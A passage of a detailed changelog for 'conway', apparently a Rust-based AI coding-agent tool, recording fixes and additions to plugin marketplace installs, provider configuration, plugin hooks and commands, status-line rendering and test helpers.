- **`LogRecord`'s wire-compatibility contract is now written down, and a test pins it against a real earlier build instead of only today's schema** — board item `01M0V2KE7PG8BF3FK90BFTSG47`. The property "every record ever written to a `<session-id>.jsonl` file must still deserialize under every later build" was previously true only by inspection at one call site (`AgentResult::transcript_ref`'s own doc, board item `01M0TX4TBJTPKN4ED50EEH2SY3`); `crates/conway-core/src/log.rs`'s module doc now states the contract itself, so the next person adding a variant or field knows what they owe (new fields on existing variants must be `Option`/`#[serde(default)]`; new variants are always safe; nothing already required may become optional-in-name-only via rename). `crates/conway-core/tests/log_wire_compat.rs` is the enforcement: `crates/conway-core/tests/fixtures/log_2026-08-15_73df3c0.jsonl` is hand-authored from `crates/conway-core/src/log.rs` (plus `agent.rs`/`content.rs`/`provenance.rs`/`ids.rs`) as they stood at commit `73df3c0` (2026-08-15, two days after this project's earliest recorded real session — see the project's own dogfooding note) — not generated from today's schema, which would test `serde`'s derive against itself and catch nothing, the exact gap `conway-plugin-trim`'s already-shipped `synthetic_session.jsonl` fixture leaves open. Auditing `73df3c0..HEAD` for every type a persisted `LogRecord` embeds found nothing already broken: every field added since is `#[serde(default)]`, and the only structural additions are new enum variants (safe in this direction by construction) or brand-new `LogRecord` variants (`ContextPathSet`, `ContextPathNamed`) that did not exist at `73df3c0` and are therefore correctly absent from the fixture.

### Fixed

- **A failed `/ask` modal fate (fork/pull-in/discard) could silently lose everything past a fixed footer row's first ~78 characters — including `RuntimeError::PullInIncomplete`'s merge counts and which child still holds the ask** — board item `01M0TYRPF1ASGQ77AK04RB7H84`. `apply_ask_fate`'s error handling and `draw_ask_modal`'s two-row footer reservation predate `pull_in`'s partial-merge disclosure (board item `01M0TNBACHQSAMMJ3TY14S47MX`), and the class was never one call site: EVERY error `apply_ask_fate` can hand `AppState::fail_ask_modal` (a refused fork, pull-in, or discard) shared the same fixed one-row error slot inside `ASK_MODAL_FOOTER_ROWS`. The footer now grows on demand — no cost while there is no error, up to `ASK_MODAL_MAX_ERROR_ROWS` (5) additional rows once there is one, comfortably fitting `PullInIncomplete`'s own `Display` at an ordinary terminal width — and hard-truncates with an explicit `…see transcript` pointer past that cap rather than dropping the remainder without saying so. The full, untruncated error text is unconditionally also pushed to the transcript as a non-fatal `Entry::Error`, durable and scrollable there regardless of what the footer itself has room for. **Finding, not designed around:** the child session `PullInIncomplete` names is kept alive specifically so the ask is recoverable, but no key reachable while the `/ask` modal is open (only `[p]`/`[f]`/`[esc]`/scroll) can inspect it — `/context <agent>` exists and would show exactly that content, but the modal's forced-choice key handling never routes to it. The safest recovery already available is `[f]` (fork), which converts the child into an ordinary persistent session reachable by `/context`/`/resume` afterward regardless of how far the pull-in got; a first-class "reconcile from here" affordance is out of this item's scope.

### Changed

- **`build_conway`, `text_response` and `fake_router` were hand-rolled in 46, 52 and 36 test files; there is now one definition of each** — board item `01M0TV8MSFRHHQ5BNZV3NHZCEW`. The cause was structural, not laziness: `conway-testkit` depends on `conway-core` and nothing else (T1 in `crates/conway/tests/architecture_invariants.rs` guards that, and it is unchanged), so it can ship a double for every port but cannot ship a helper that returns a `Conway` — it cannot see `ConwayBuilder`. The doubles had a home; assembling them into a working harness had none. **The new home is `conway::test_support`, behind a non-default `test-support` feature** that implies the existing `testkit` one: a third party enabling nothing sees neither the module nor the `conway-testkit` dependency it pulls in, which makes it the smallest shape that keeps the wiring out of the default public surface (a new workspace crate would have been a second, publishable package whose only job is to be dev-depended on). `conway`'s own suite reaches it through a dev-dependency on itself — the standard way a package turns one of its own features on for its own test targets — and the eight other consuming crates name the feature in `[dev-dependencies]`; `Cargo.lock` gains exactly one line. `text_response` went to `conway-testkit` instead, because 13 of its 52 copies are in `conway-runtime`'s suite and `conway-runtime` cannot see the facade at all.
- **Two of the three helpers turned out to be two helpers each, and the split is preserved rather than papered over.** 39 `text_response` copies built `Usage::default()`; 13 built `Usage { input_tokens: 10, output_tokens: 5, .. }` — and those 13 are exactly the suites that assert on token accounting, so unifying them would have silently changed what they measure. `text_response_with_stub_usage` is the second constructor, imported under the name those files' 134 call sites already used. Likewise three routers named `fake_router` were never copies of `FakeRouter::single`: `tests/builder.rs` and `tests/install_selected.rs` inject an EMPTY route chain and `tests/backend_factory.rs` takes the backend id as a parameter. They keep their behaviour exactly and are renamed to say what they are (`empty_router`, `router_to`), so one name stops meaning three routers. The other 30 `fake_router` copies were trivial wrappers and are gone: 27 became dead when their only caller moved, and the remaining five call sites say `FakeRouter::single(echo_model())` directly.
- **Two shared builders, because injecting a router is not always safe.** `test_builder` pre-wires only ports `ConwayBuilder` stores as an `Option` (store, gate, router), so a later `with_*` replaces rather than adds; a backend is deliberately not pre-wired, since `with_backend` pushes onto a list and a default one could never be overridden, only silently added to. `test_builder_without_router` exists because `build()` documents that an injected `Router` wins unconditionally over a `RouterFactory` — four suites resolve their router or backend from config through a factory, and a pre-wired `FakeRouter` would pre-empt the thing under test. **No shared `base_config()`**: the 46 files had 14 genuinely different configs between them, which is a separate question from the wiring, so every helper takes the caller's `ConwayConfig`. Twelve local helpers survive under scenario names (`conway_with_selection`, `conway_with_hook_rules`, `skeleton_conway`, ...); none of them assembles a `Conway` any more. Zero behaviour change was checked beyond compilation: for all 42 converted files, every `with_*` call the old local helper made is still reached by the new call path (a dropped `with_builtin_plugins` would compile fine and quietly disarm a test), and all 585 old call-site arguments still appear. Removing the copies orphaned 275 imports across 41 files, so both the default and `--all-features` builds stay warning-free.

### Documented

- **A tier-level configurability rule now exists for an operator to read, stated once rather than assumed at three separate sites** — board item `01M0V501HZBMWNC6AE45JJXAFK`. `PluginConfig` is a real, plumbed, per-agent narrowing mechanism (`Runtime::narrow_plugin_config_for_fork`, `conway.fs`'s own `root` key its proving consumer), and `[S1.5]` (39 sites across `conway-core`, `conway-runtime`, `conway-tools`, `conway-session`, and `conway`) already ruled it embedder-only "for this first slice" — but that ruling lived only in source comments an operator never reads, and was never connected to the tier-level question of whether an operator can configure a first-party plugin at all. `docs/plugins/README.md` and `PHILOSOPHY.md` §6 now each state the rule once, in an operator-facing location: `[plugins].install` decides *whether* a first-party plugin runs, never *how* it behaves once installed, citing both `[S1.5]` and `first_party_plugins::bundle()`'s own "a worked example, not a commitment to any of its members individually" framing. `conway-plugin-trim`'s module doc and `docs/plugins/README.md`'s `conway.trim` bullet each carried a standalone no-knob argument that independently reached the same conclusion; both now point at the stated rule instead of re-deriving it, keeping only what is genuinely specific to the 8-turn window (a curation heuristic with no operator feedback loop, not a budget). **What "for this first slice" means today is deliberately left open** — `[S1.5]` names an expiry it never dated, and several waves of plugin work have landed since; that is an operator decision, not a documentation one, and no prose here says or implies it either way. No code, config schema, or test changed.

### Fixed

- **`Plugin::status_contributions()` was collected, exposed on the facade as `Conway::plugin_status_contributions()`, and read by nothing — the built-but-unreachable defect this tree keeps catching, sitting in a surface two design docs now depend on** — board item `01M0X1B7Z41J57N6YP2JFZ2AZW`, argued in `docs/vision/DESIGN-permission-modes.md` §3d/§6b. The TUI status line now has a `plugins` field (`view::status::status_line_spans`) that renders `PluginStatusContribution`s as `key: value`, with `status: Failed` (and every other non-`Completed` variant — `Cancelled`/`BudgetExceeded`/`Rejected`) styled `theme.error` (plain red), visually distinct from the unstyled healthy case and from `theme.fatal_error`, which stays reserved for `AUTO-ALLOW` alone — the design's own hazard was that a live guard and a dead guard reported identically, and this is the type `PluginStatusContribution::status` already carried for exactly this. **The one guarantee that mattered most: a contribution can never displace the permission-mode field.** `drop_priority` ranks `plugins` strictly below `mode`, so every contribution is already forced down to its own empty floor before `mode` is ever asked to give up a column — tested explicitly against the FORCED-IN case (a `fields` config naming neither `mode` nor `plugins`, `AUTO-ALLOW` active, five contributions including two failures all competing for the same narrow width). Bounded, not silently truncated: at most three contributions are spelled out individually; the rest fold into a visible `+N more` marker. Zero contributions (the overwhelmingly common case) renders byte-identically to before this item, pinned by a literal string-equality test. `Conway::plugin_status_contributions()`'s own doc no longer describes an unrendered accessor. **Disclosed gap, not fixed here:** `AppState::plugin_status_contributions` — the field the render path actually reads — is not yet populated from a running session; threading `conway.plugin_status_contributions()` through at TUI startup (the same "populate once outside the render path" shape `AppState::plugin_commands`/`agent_names` already use) is a follow-up, out of this item's file-ownership scope.
- **That follow-up: `AppState::plugin_status_contributions` was still only ever set by tests — the same built-but-unreachable shape, moved one link further along the chain** — board item `01M0XC1GF73Z9GTE7TN65TRW4A`. `App::new` now copies `Conway::plugin_status_contributions()` into `AppState::plugin_status_contributions` once at TUI startup, the same "populate once, outside the render path" shape `plugin_commands`/`agent_names` already use — proven with a real `ConwayBuilder::with_plugin`-installed plugin (never `AppState` set by hand) whose contribution reaches both the field and the actually rendered status line. **At the time this item closed, this was the snapshot option, not the live one, stated plainly rather than implied:** `Conway::plugin_status_contributions()` was a build-time snapshot collected once in `ConwayBuilder::build`, before any `status/1` notification had arrived — typically empty at real session start, and frozen at whatever it held for the rest of the process's life. A plugin's health changing mid-session (a guard dying, a build finishing) did not move this value; a genuinely live per-session poll was a separate, larger piece, not built here. Both `Conway::plugin_status_contributions()`'s own doc and `AppState::plugin_status_contributions`'s own doc said so. The `Mode`-outranks-`plugins` safety property (`drop_priority`) is untouched — its existing test needed no edit. **2026-08-27 correction: the live poll named above as unbuilt is now built** — board item `01M0Y3A8MYKKE0GMYKZE1K0QTD` (commit `00cba5c`), `Conway::poll_plugin_status_contributions` on a bounded 1s tick in `conway-cli`'s `App::run`; see the new entry for that item and `docs/plugins/statusline.md`.

### Fixed

- **`/plugin install` against a real, published Claude Code marketplace failed with a `serde_json` parse error about GitHub's own HTML — this corrects the "conway can now install a plugin from a Claude Code marketplace" claim made when `01M0VR96Y87FF2BVNTBSC6GEYR` shipped, which was true only for a marketplace conway itself authored** — board item `01M0Y6RYZA94BK6YXJ7X8TNEGR` (ruling 2026-08-29). No published Claude Code marketplace has ever used conway's own files-map, `id`-identified `plugins[]` shape; `conway-plugin-marketplace` understood nothing else, and passing a repository page (`https://github.com/<owner>/<repo>`, the form Claude Code documents) got GitHub's HTML back and reported the resulting parse failure as if the operator had handed it bad JSON. All four layers are now closed, bounded exactly as the ruling scoped them: (1) a repository URL that answers with markup instead of JSON is now refused as `not_a_manifest_url`, naming what conway wanted and suggesting `.claude-plugin/marketplace.json` when the input is a bare GitHub repo URL — never a `serde_json` column reference to someone else's `<head>` tag; (2) `MarketplaceManifest` now reads `owner`/`metadata` (real Claude Code manifests carry both), read permissively rather than added to a widened `deny_unknown_fields` set — the same "foreign format, not one this project owns the schema of" posture `conway_plugin_claude` already uses for every Claude Code file IT reads; (3) `MarketplacePluginEntry` accepts a real entry's `name`+`source` shape alongside conway's own `id`+`files` one (`MarketplacePluginEntry::identity` resolves either to the one string an operator names), with `source` a custom-parsed tagged union so a source kind this crate does not know about still parses (browsing still works) rather than failing the whole manifest; (4) a `git-subdir`/`github` source now actually FETCHES, by invoking the SYSTEM `git` binary — no git library entered this workspace's lock, matching the ruling's own bound: `git2` is still absent, and `git` being unusable at all refuses by name (`git_unavailable`) rather than failing partway through a clone. **No archive support was added, and none is coming from this**: a source kind requiring `.tar.gz`/`.zip` extraction (`tar`/`zip` are still not dependencies) parses (so browsing a marketplace listing one still works) but refuses BY NAME the moment an install is attempted. A git checkout is untrusted content too: a `git-subdir` URL that is not `http://`/`https://` is refused before `git` is ever invoked (git's `ext::`/`fd::` remote-helper transports can run an arbitrary command or read an arbitrary local file, and the URL is network-supplied), the clone is bounded by a 120s timeout, and the checked-out plugin root is walked and refused outright if it contains a symlink anywhere, before a single byte is copied into conway's own plugin store — a narrower version of the archive-traversal hazard class this crate's own "no archive extraction" argument already named, not an absent one. `/plugin`'s own `/help`/palette description, which used to promise "install/uninstall a Claude Code marketplace" plugin while nothing in the tree made that true, now states it because it now is. `crates/conway-plugin-marketplace/tests/claude_code_manifest.rs` — a real, published marketplace's verbatim bytes, committed as a fixture, that used to assert conway's parser REFUSED them — now asserts it accepts and can browse them; the fixture itself is unchanged. `docs/plugins/marketplace.md` and `docs/plugins/trust-and-security.md` (a new "Fetching a git-sourced entry is still a network trust boundary" section, cross-referenced both directions) are updated in the same change.

### Fixed

- **The very next operator attempt after the fix above — installing ideate's own real marketplace — still failed, on all three routes: a plain-string `source`, an `owner/repo` shorthand, and the repository URL itself. `01M0Y6RYZA94BK6YXJ7X8TNEGR` was a single-fixture ruling; this is the second real-world manifest shape found within hours of it shipping** — board item `01M1A9J9C9YRH3YPTGD335HZPZ`. Three defects, closed together against a newly committed fixture (`crates/conway-plugin-marketplace/tests/fixtures/ideate-marketplace.json`, ideate's own real manifest, fetched 2026-08-30): **(1)** ideate's `plugins[]` entry names `"source": "./"` — a plain JSON STRING meaning "this repository IS the plugin," not an object naming `git-subdir`/`github`. conway's custom `PluginSource` `Deserialize` called the object-shaped lookup on it unconditionally and reported `missing field \`source\`` — an accurate-sounding but useless error about the exact value it was reading. `PluginSource::RelativePath` is the new variant; `crate::git_source::clone_url`/`subdir` resolve it against whichever GitHub repository the marketplace manifest was itself reached through (`crate::manifest::github_repo_from_url`, one parser shared by three call sites), refusing by name (`unresolvable_relative_source`) when that repository cannot be determined at all rather than guessing one. **(2)** `owner/repo` GitHub shorthand (Claude Code's own `/plugin marketplace add owner/repo` form) used as a marketplace URL reached `reqwest`'s own request builder as a non-absolute URL and surfaced literally as **"builder error" — an HTTP-client implementation detail, never meant for an operator.** `resolve_marketplace_url` now recognizes the shorthand (and a bare repository URL, defect 3 below) and expands it before any request is attempted; a second, defense-in-depth check at the actual HTTP call site (`reqwest::Error::is_builder()`) catches the same failure mode for anything else that still could, mapping it to the new, named `MarketplaceError::InvalidUrl` — no path returns `reqwest`'s own error text now. **(3)** `01M0Y6RYZA94BK6YXJ7X8TNEGR` was **supposed** to make hunting for the raw manifest URL unnecessary, but only wired the git-FETCH half (a `source` *inside* an already-parsed manifest) — the TOP-LEVEL marketplace fetch itself never resolved a bare `https://github.com/<owner>/<repo>` URL at all, so `/plugin install https://github.com/ideate-ai/ideate ideate` still returned "returned a web page, not a marketplace manifest," sending the operator to hunt for the raw URL by hand exactly as before. `resolve_marketplace_url` closes this for the top-level fetch too: a bare repository URL (no deeper path) resolves to `https://raw.githubusercontent.com/<owner>/<repo>/HEAD/.claude-plugin/marketplace.json` and conway GETs that directly — the "returned a web page" advice no longer fires for this exact shape at all, since it is never reached. The full parity command from the operator's own report, `/plugin install https://github.com/ideate-ai/ideate ideate`, now installs end to end: reads the resolved manifest, resolves the relative source against the same repository the URL already named, and installs via git — proven against the committed fixture with a stub `git` that captures its own `clone` argv, asserting the exact derived URL (`https://github.com/ideate-ai/ideate.git`), not merely that installation eventually succeeded. **`docs/plugins/marketplace.md`** ("A relative source" and "Passing a repository URL or shorthand" sections) and **`docs/migrating-from-claude-code.md`** (the `ideate@ideate-marketplace` worked example, which had asserted this exact command already worked before it did) are corrected in the same change. **Checked for a further, fourth manifest shape and found none**: no real manifest observed combines `id`+`source` or `name`+`files`, none nests a marketplace inside another's own `plugins[]`, and the `directory` `source` kind Claude Code's own schema also documents was already representable (`PluginSource::Unsupported`, refused by name only at install time) — stated as a documented finding, not a silent assumption. `PluginSource` gaining a variant required updating its two internal exhaustive matches (`crate::git_source::clone_url`/`subdir`) plus one external site outside this crate's own ownership fence (`crates/conway-cli/src/tui/app/marketplace.rs`'s `source_note` match, in `App::apply_marketplace_install`) — delegated, not fixed here, since that file was out of this item's file-ownership scope; the one-arm patch it needs is recorded on the board item itself.

- **`/settings`' add-provider flow had the identical no-chain defect the guided-setup fix above closed, reached through a second, real door** — board item `01M1A54RS91QHHHTY7N1PV8X0H`. Decline first-run (supported: `Esc` leaves the app open), add a provider through `/settings`, and the resulting `settings.json` carried `backends.<id>` and nothing else — `default_role`/`roles` untouched, so the next prompt died with `no candidate for role default (0 considered)`, the exact operator-reported symptom the guided-setup fix already closed on its own door. `crates/conway-cli/src/tui/app/provider_manage.rs::write_provider_entry_and_refresh` now calls a new `wire_provider_into_default_chain` after `set_backend_provider` succeeds: it reads which role `default_role` currently names (`app/defaults.rs::load_default_role_lax`, widened from `fn` to `pub(super)` and reused rather than re-read a second way) and that role's current chain (`provider_manage.rs::load_roles_lax`, already existing), appends `first_run::chain_entry(id, model)`, and persists both via the SAME two writers `first_run::persist_chain` already established for the guided-setup fix — `conway::config::ensure_default_role` then `set_role_chain` — never a second opinion about either the chain-entry format or the write mechanics. **Decided: a newly added provider is always APPENDED to the current `default_role`'s chain, never left unwired** — the same "order added = chain order" rule guided setup's own module doc states, extended here rather than re-decided; an empty floor role's chain and an already-working chain are handled by the identical code path (append), since an empty chain is exactly the shape "append" already produces on its own. Rejected: leaving a newly added provider inert until the operator does something else — silence about that state is exactly what this item's own report called out as the finding, and wiring it is less work than building a second UI just to say a provider does nothing yet. Tested end to end, mirroring `first_run.rs`'s own load-bearing shape rather than merely asserting the backend entry was written (the test that was green while the product was broken): `add_provider_via_settings_after_declining_first_run_completes_a_real_prompt` builds a SEPARATE `Conway` from the exact file the write path left behind and completes a real turn against a mock server; a second test pins the append behavior against an already-working chain, preserving the existing entry and adding the new one after it, in order.

- **The provider-removal guard, correct when written, had its own premise invalidated by the two fixes above — and stopped letting anything be removed at all** — board item `01M1A9K7KHA78Q9V0NNGEFXC9F`, reported minutes after rebuilding: *"opening settings->providers doesn't let me remove a model (cannot remove ollama_cloud -- role(s) default still names in their chain...). This happens with both models which are available."* The removal guard (`provider_manage.rs::apply_remove_provider`) refused removing a provider ANY role's chain still named, on the premise that chains were sparse; both fixes above now guarantee every configured provider lands in `default_role`'s chain, so "any role still references this provider" became true of every provider, always, and the guard's real intent — never let a role drop to zero routable candidates — quietly became "never let anything be removed." Narrowed: `roles_referencing_provider` is replaced outright (not joined by a second function) with `roles_left_unroutable_by_removing`, which refuses a removal ONLY when it would leave a role's chain completely EMPTY — a role with another, independently declared entry keeps its real fallback and is no longer blocked. Two alternatives considered and rejected, recorded in `provider_manage.rs`'s own module doc: warn-and-proceed (reintroduces the exact "found out at the next routing failure instead of now" harm the original ruling was written against) and keeping the broad guard while adding a chain-editing UI (more work for a worse outcome — it would still refuse removals that are already perfectly safe). The refusal message itself is corrected: the old "update those roles first" named an action this app has never had a UI for; the new wording names only what actually exists — add another provider first (which, via the fix above, appends to the SAME `default_role` chain this guard protects) or leave the provider configured. **Known, disclosed limit**, not silently absorbed: that remedy is exact when the affected role is `default_role` (the only role this app's own write paths ever populate) and imprecise for a hand-authored non-default role, which this app still has no way to grow a chain for. The module doc's original "Removal has consequences" section is kept, not deleted, and dated 2026-08-30 to record exactly what changed and why, matching `openai_compat/probe_impl.rs`'s own two-dated-observations precedent. Tested: a fallback-preserving removal now succeeds (previously refused); a single-provider config — exactly what a one-provider first run now produces — still refuses removing its only routable entry; the refusal message is asserted to name "add another provider" and never "update those roles."

## [0.9.0] — 2026-08-13

### Added

- **A plugin command can now fork its own calling session and hand the TUI
  the child to drive** -- the answer
  to what `conway-core` must expose for `/rewind` to be a plugin at all, per
  the owner's ruling that "features like /rewind, /checkout, etc are to be
  plugins... not core functionality." `CommandOutcome` gains a third variant,
  `ForkSession { at_seq: LogSeq, directive: String }`, alongside the existing
  `Output`/`Error`: the plugin RETURNS a request rather than being handed a
  live handle, and the host (`conway-cli`'s `App`) performs the fork with its
  own already-live `Conway::fork_from`, then swaps its driven `SessionHandle`
  for the child and resubscribes -- the same declare/return-an-effect shape
  `ContextHook`/`status.declare/1` already use, chosen deliberately over
  giving the plugin a fork-capable handle (a strictly smaller capability to
  hand out). `CommandCtx` gains a fourth field, `session_id`, the calling
  session's own id.

  **Bound to the invoking session, structurally, not by convention.**
  `ForkSession` carries no session identifier of its own -- there is no
  field through which a command could name a session other than the one it
  was invoked from, the same "acts on its own session, never one it names"
  property's `SubagentHandle`
  established for tools. `conway-cli`'s host resolves every `ForkSession`
  against the `CommandCtx::session_id` it captured AT INVOCATION time, never
  against whatever session it happens to be driving once the reply arrives
  (the two can legitimately differ under a `/resume` race) -- proven by a
  new adversarial test that simulates exactly that race against a real
  `Conway`, and shows the fork lands on the correct session while the one
  the host raced onto stays byte-for-byte untouched. The parent session's
  own log is never mutated by a fork (`Conway::fork_from`'s existing
  zero-copy contract), verified directly.

  No dependency was added from `conway-core` to `conway` -- the architecture
  tests (`crates/conway/tests/architecture_invariants.rs`) pass unchanged --
  and `no_forbidden_deps` (`crates/conway-cli/tests/cli_surface.rs`) still
  passes: no plugin reaches a `conway-cli` internal. `docs/plugins/hooks.md`
  point 15 and `docs/plugins/trust-and-security.md` are updated to state the
  new (narrow) capability in place of the bound they previously described as
  a hard wall.

- **`/conway.history.rewind <seq>`: a first-party plugin proving `/rewind`
  genuinely is a plugin**, the real
  consumer of `CommandOutcome::ForkSession` (above). New crate
  `crates/conway-plugin-history`, one command, no tools, written entirely
  against `conway::plugin` -- the same public surface a third-party author
  gets. Not installed by default; `"conway.history"` in `plugins.install`
  turns it on (`docs/getting-started.md`, `README.md`).

  **The discriminating proof this item names, both asserted against the
  real crate:** with the plugin not installed, `/conway.history.rewind 1`
  is an ordinary "unknown command" notice -- no stub, no special case in
  core (`crates/conway-cli/src/tui/app.rs`'s
  `conway_history_rewind_is_an_unknown_command_when_the_plugin_is_not_installed`).
  Installed, it forks the real calling session end to end, and the parent's
  own persisted records are asserted byte-for-byte (`LogRecord: PartialEq`)
  unchanged after the fork, not merely head-count equal
  (`conway_history_rewind_forks_the_real_plugin_and_leaves_the_parent_log_byte_for_byte_unchanged`).

  **A seq is now operator-visible, closing the gap that would otherwise
  have made this command unusable.** Before this item, nothing in the TUI
  showed a `LogSeq` at all -- the live event stream's own `Envelope::seq`
  is a per-connection renumbering, not the persisted seq `fork_from`
  accepts, so surfacing it directly would have been actively misleading.
  The status line's existing `session <id>` field now reads `session
  <id>@<seq>` once the head is known, reusing `session_ref.rs`'s own
  `<session-id>[@<seq>]` notation, kept authoritative via the existing
  `Conway::session_head` facade call (no new port) at session start, after
  every root-agent turn boundary, and immediately after a fork (the
  child's fresh head is exactly the seq it was forked at, no round trip
  needed).

  **Disclosed, not built:** `CommandCtx` grants no transcript-read
  capability, so only an explicit `<seq>` argument works -- resolving free
  text ("before the bad edit") needs a further, separately-justified
  read-only capability this item does not add (`docs/plugins/hooks.md`
  point 15's own disclosure, restated in this crate's module doc).

- **`docs/plugins/authoring.md` rewritten around the declarative hook
  surface, executed rather than reasoned about** (, the 1.0-beta acceptance test — same genre
  and rigour as `.design/getting-started-default-build-walkthrough.md`).
  The page's own opening claim — "the declarative surface is decided, not
  built" — went false the same day two other beta items landed (the `match`
  field, and `ConwayBuilder::install_selected`), and this change is what ran the
  page against both, not merely read them. "Ten minutes to a working hook"
  is now the declarative `hooks.rules[]` path — narrowed with `match`, no
  Rust, no compiling — proven by a real local-Ollama session where a
  matcher-narrowed `post_tool_use` rule fires for `bash` and, in a
  counterfactual run with `match` pointed elsewhere, correctly does not.
  The old in-process `ContextHook` walkthrough is preserved verbatim as
  "Going further," reframed as the only path with edit/drop/replace
  authority. "Writing a Rust plugin" is rebuilt around
  `ConwayBuilder::install_selected` with a real, executed end-to-end
  example (a plugin's tool actually invoked by a real model), states
  plainly that installing a plugin requires building a binary today (no
  runtime plugin host exists; the future is),
  names `Plugin::commands()`/`Plugin::events()`, and documents a real
  gotcha this walkthrough hit and `docs/embedding.md`'s own illustrative
  example doesn't warn about: `install_selected`'s `plugins.install`
  resolution unions in `plugins.default_backends` (default `["anthropic",
  "openai-compat"]`), so a facade-only binary linking only one dialect
  factory fails with `plugins.install names unknown id 'anthropic'` unless
  it also narrows `default_backends`. `concepts.md`'s "Hook-first" and
  "Language choice" sections, which made the identical now-false "decided,
  not built" claim about the same surface, are corrected in the same
  change. Full transcript, every divergence found (fixed on the page or
  enumerated), and the steps-to-first-visible-result measurement for both
  halves: `.design/authoring-walkthrough-evidence.md`.

- **A plugin can now declare and fire its own custom hook event** -- the open-vocabulary half of `PHILOSOPHY.md`
  §5's hooks claim: "A plugin declares the events it emits... Those events
  sit at the same level as the ones conway emits." `Plugin::events()` is the
  new declaration surface, added on the exact same precedent as its sibling
  `Plugin::commands()` (which shipped earlier the same day): a bare
  `EventDecl { name, summary, carries_tool_name }`, host-prefixed with the
  declaring plugin's own manifest id, never chosen by the plugin itself.
  `ToolCtx` gains a `plugin_events: PluginEventHandle` capability, bound at
  construction to the invoked tool's own declaring plugin id, so a call to
  `.emit(bare_name, payload)` can only ever produce that plugin's own
  namespaced event -- never another's. A plugin-declared event dispatches
  through the IDENTICAL observation-only `HookDispatcher::dispatch` every
  core event (`post_tool_use`, `session_starting`, ...) already uses --
  fails open, cannot deny; there is no second, deny-capable tier for plugin
  events (YAGNI: nothing needs one yet). `conway_runtime::hook_dispatch::
  declared_plugin_events` namespaces and validates every installed plugin's
  declared events with the same shared `validate_event_name` validator
  `Plugin::commands()`'s own registrar already uses for command names -- and
  doubles as the answer to "how does an operator discover what is hookable
  given what they have installed": an embedder already holding its own
  plugin list can call this function directly, before `build()`, with no new
  registry. `ConwayBuilder::build` unions the result into the same dispatch
  table `hooks.rules[]` already feeds, and gives a named, build-time error
  for a `match` on a plugin event whose own declaration says its payload
  carries no tool name -- the plugin-event extension of the identical check
  a core event without one has always gotten. `merge::validate` also now
  enforces the subscriber-side event-name shape (bare or
  `plugin_id.event_name`) on every `hooks.rules[]` entry, closing a
  FOLLOW-UP `schema::HookEntry::event`'s own doc comment had left open since
  the `hooks` schema first landed.

  **Also reconsiders, disclosed rather than silently reversed, an earlier
  design decision that a plugin id must never contain the namespace
  separator** (`.design/extension-architecture.md` §16.6 point 3): every
  real built-in plugin id in this workspace (`conway.fs`, `conway.shell`,
  `conway.report`, `conway.subagent`, `conway.plugin_skeleton`) already
  contains it, and the declaration-side validator never recovers a plugin's
  id by splitting the assembled name apart -- the misattribution hazard the
  original exclusion existed to prevent cannot occur there by construction.
  A genuine full-name collision between two different declarations is still
  caught, as a duplicate, at `declared_plugin_events`.

  `conway-plugin-skeleton` proves the whole path end to end, exactly as the
  item requires: `SkeletonPlugin::events()` declares `pong_dispatched`, and
  `SkeletonPingTool::invoke` fires it, unconditionally, on every call
  (`PHILOSOPHY.md` §5: "An event a plugin declares and never fires is the
  same defect as a tool that does nothing"). A new test wires a real
  `HookRunner` double through `ConwayBuilder::with_hook_runner`, configures a
  `hooks.rules[]` entry naming the skeleton's namespaced event, drives a
  real turn through a real `Conway`, and asserts the hook fired exactly once
  with the exact reply text the tool actually produced.
  (`crates/conway-core/src/ports/plugin.rs`,
  `crates/conway-core/src/event_name.rs`,
  `crates/conway-runtime/src/hook_dispatch.rs`,
  `crates/conway-runtime/src/tools/registry.rs`,
  `crates/conway-runtime/src/tools/runner.rs`,
  `crates/conway/src/builder.rs`, `crates/conway/src/config/schema.rs`,
  `crates/conway/src/config/merge.rs`, `crates/conway/src/lib.rs`,
  `crates/conway-plugin-skeleton/src/lib.rs`,
  `crates/conway-plugin-skeleton/tests/skeleton_end_to_end.rs`,
  `crates/conway-tools/src/testing.rs`, `crates/conway-tools/tests/subagent.rs`,
  `crates/conway/tests/config_validation.rs`, `docs/plugins/hooks.md`)

- **Hook-backed permission rules are now visible and individually revocable
  in `/settings`, as a fourth review list alongside allow/deny/prompt**
 . Before this item, a `pre_tool_use`
  or `prompt_submitted` hook that could silently deny a call had no surface
  anywhere in the TUI -- turning one off meant hand-editing `enabled` in
  `settings.json` and restarting, which fails `PHILOSOPHY.md` §5's own
  security property for hooks ("it appears wherever other permission rules
  appear, and it is individually revocable"). The new **hooks** section
  lists every rule for BOTH deny-capable events -- `pre_tool_use` (narrows a
  tool call) and `prompt_submitted` (narrows a submitted prompt, now that
  it dispatches) -- naming its `id`, event, tool matcher (`match`, or "every
  call"), and origin; a rule whose script is broken or missing still
  appears (fail-closed means it is currently denying everything it
  matches, which is exactly when an operator most needs to see and revoke
  it). Observation-only events (`post_tool_use`, `session_starting`,
  `child_spawned`, `request_assembled`, `child_reported`) are deliberately
  excluded -- they cannot deny a call, so there is nothing here for them to
  silently keep authorizing by staying enabled; turning one off is still a
  config edit. Selecting a row and pressing `Enter` revokes it for the rest
  of the session, mirroring every other `/settings` toggle's session-only
  scope (there is still no `settings.json` writer). New facade surface:
  `Conway::active_deny_capable_hook_rules`/`Conway::revoke_hook_rule`
  (`crates/conway/src/conway.rs`), backed by new read-only getters on
  `PermissionBroker`/`HookDispatcher`/`Runtime`
  (`crates/conway-runtime/src/permission.rs`,
  `crates/conway-runtime/src/hook_dispatch.rs`,
  `crates/conway-runtime/src/runtime.rs`) -- no change to either's existing
  dispatch or fail-closed behavior. Proven end to end against a real
  `hooks` config, a real spawned hook process, and a real `bash` tool call
  (`crates/conway/tests/hook_revoke_seam.rs`): a denying hook blocks the
  call, revoking it through the exact facade method the UI action calls
  lets the next matching call through, in the same session.
  (`crates/conway-runtime/src/permission.rs`,
  `crates/conway-runtime/src/hook_dispatch.rs`,
  `crates/conway-runtime/src/runtime.rs`, `crates/conway/src/conway.rs`,
  `crates/conway/src/lib.rs`, `crates/conway-cli/src/tui/state.rs`,
  `crates/conway-cli/src/tui/input.rs`, `crates/conway-cli/src/tui/app.rs`,
  `crates/conway-cli/src/tui/view/settings.rs`,
  `crates/conway-cli/src/tui/test_support.rs`,
  `crates/conway/tests/hook_revoke_seam.rs`, `docs/interactive.md`)

- **A way to load config while ignoring the ambient user layer**. Every config load merges five sources --
  `default < user < project < env < CLI` -- and `LoadOptions::explicit_path`
  (and therefore `ConwayBuilder::from_config(path)`) only ever replaces the
  *project* layer: the user layer
  (`$CONWAY_CONFIG_DIR/settings.json`, or `~/.conway/settings.json`) was
  read unconditionally, before it, every time -- `from_config`'s own doc
  comment ("still layered under XDG/env/CLI precedence") was accurate, but
